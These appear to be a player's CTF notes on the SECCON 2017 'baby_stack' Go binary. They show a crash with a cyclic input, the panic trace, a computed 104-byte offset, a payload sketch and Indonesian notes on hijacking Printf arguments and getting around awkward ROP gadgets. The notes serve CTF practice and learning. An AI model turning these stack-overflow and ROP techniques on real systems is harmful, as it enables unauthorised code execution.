Can you do a traditional stack attack?

Host : baby_stack.pwn.seccon.jp
Port : 15285
baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8


# Crash Message
➜  baby_stack git:(master) ✗ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8
Please tell me your name >> BBBBCCCC
Give me your message >> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
panic: runtime error: growslice: cap out of range

goroutine 1 [running]:
panic(0x4e4800, 0xc820074280)
	/usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6
fmt.(*fmt).padString(0xc82007abb8, 0x6261616362616162, 0x6261616562616164)
	/usr/lib/go-1.6/src/fmt/format.go:130 +0x406
fmt.(*fmt).fmt_s(0xc82007abb8, 0x6261616362616162, 0x6261616562616164)
	/usr/lib/go-1.6/src/fmt/format.go:322 +0x61
fmt.(*pp).fmtString(0xc82007ab60, 0x6261616362616162, 0x6261616562616164, 0xc800000073)
	/usr/lib/go-1.6/src/fmt/print.go:521 +0xdc
fmt.(*pp).printArg(0xc82007ab60, 0x4c1c00, 0xc820074260, 0x73, 0x0, 0x0)
	/usr/lib/go-1.6/src/fmt/print.go:797 +0xd95
fmt.(*pp).doPrintf(0xc82007ab60, 0x5220a0, 0x18, 0xc820043ea8, 0x2, 0x2)
	/usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd
fmt.Fprintf(0x7f922b6a31c0, 0xc820084008, 0x5220a0, 0x18, 0xc820043ea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)
	/usr/lib/go-1.6/src/fmt/print.go:188 +0x74
fmt.Printf(0x5220a0, 0x18, 0xc820043ea8, 0x2, 0x2, 0x20, 0x0, 0x0)
	/usr/lib/go-1.6/src/fmt/print.go:197 +0x94
main.main()
	/home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e

0x6261616362616162 => baabcaab => 104 offset


# Pitfal
$payload="A"*104 + "CCCCDDDD"
$rax=0xfffffffffffffff3
$rsi=0x4444444443434343
|> 0x401459 <main.main+1113>    call   fmt.Printf <fmt.Printf>
    |> 0x456825 <runtime.memmove+869>    mov    rax, qword ptr [rsi]

harus overwrite argument printf dan argument slicebytetostring
gadget rdi dan rdx terganggu dengan instruksi seperti "or byte ptr [rax - 0x77], cl", bypassnya dengan memberikan address/pointer ke register rax